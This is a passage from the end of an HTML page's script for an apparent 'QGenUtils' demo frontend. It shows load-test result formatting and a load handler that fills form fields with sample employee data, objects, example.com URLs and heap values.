            resultBox.innerHTML = `Load Test Results:\n\nConcurrent Users: ${users}\nRequests per User: ${requests}\nTotal Requests: ${totalRequests}\nSuccessful: ${successfulRequests}\nSuccess Rate: ${((successfulRequests / totalRequests) * 100).toFixed(2)}%\n\nPerformance:\nDuration: ${duration.toFixed(2)}ms\nRequests/sec: ${(totalRequests / duration * 1000).toFixed(0)}\nAvg Response: ${avgResponseTime.toFixed(2)}ms\nMin Response: ${minResponseTime.toFixed(2)}ms\nMax Response: ${maxResponseTime.toFixed(2)}ms\n95th Percentile: ${p95ResponseTime.toFixed(2)}ms`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        // Initialize demo with some sample data
        window.addEventListener('load', function() {
            // Set today's date as default
            const baseDateElement = document.getElementById('baseDate');
            if (baseDateElement) {
                baseDateElement.valueAsDate = new Date();
            }
            
            // Add sample data for array processing
            document.getElementById('arrayData').value = JSON.stringify([
                { name: "John Doe", age: 30, department: "Engineering", salary: 80000 },
                { name: "Jane Smith", age: 25, department: "Marketing", salary: 65000 },
                { name: "Bob Johnson", age: 35, department: "Engineering", salary: 95000 },
                { name: "Alice Brown", age: 28, department: "Sales", salary: 72000 }
            ], null, 2);
            
            // Add sample objects for merging
            document.getElementById('object1').value = JSON.stringify({ a: 1, b: 2, user: { name: "John" } }, null, 2);
            document.getElementById('object2').value = JSON.stringify({ b: 3, c: 4, user: { age: 30 } }, null, 2);
            
            // Add sample URL data
            document.getElementById('protocolInput').value = "example.com";
            document.getElementById('urlParseInput').value = "https://api.example.com/v1/users?page=1&limit=10";
            document.getElementById('urlValidateInput').value = "https://secure.example.com/path";
            document.getElementById('urlBatchInput').value = "example.com\nhttps://test.com\nhttp://api.example.com";
            
            // Add sample heap data
            document.getElementById('heapInsert').value = "5, 3, 8, 1, 9, 2";
            
            console.log('QGenUtils Demo Frontend initialized successfully!');
        });
    </script>
</body>
</html>